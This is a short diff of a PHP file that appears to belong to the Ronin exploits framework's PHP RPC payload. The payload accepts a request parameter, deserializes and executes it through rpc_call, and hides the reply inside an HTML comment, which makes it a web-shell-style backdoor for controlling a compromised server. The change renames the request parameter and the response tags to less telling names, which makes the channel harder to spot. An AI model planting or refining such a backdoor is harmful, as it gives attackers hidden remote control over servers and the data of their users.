@@ -318,12 +318,12 @@ function rpc_call($request)
 
 define('RPC_BASE_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc');
 
-if (isset($_REQUEST['rpc_request']))
+if (isset($_REQUEST['_request']))
 {
-  $request  = rpc_deserialize(rawurldecode($_REQUEST['rpc_request']));
+  $request  = rpc_deserialize(rawurldecode($_REQUEST['_request']));
   $response = rpc_serialize(rpc_call($request));
 
-  echo "<!-- <rpc-response>{$response}</rpc-response> -->";
+  echo "<!-- <response>{$response}</response> -->";
 }
 else
 {
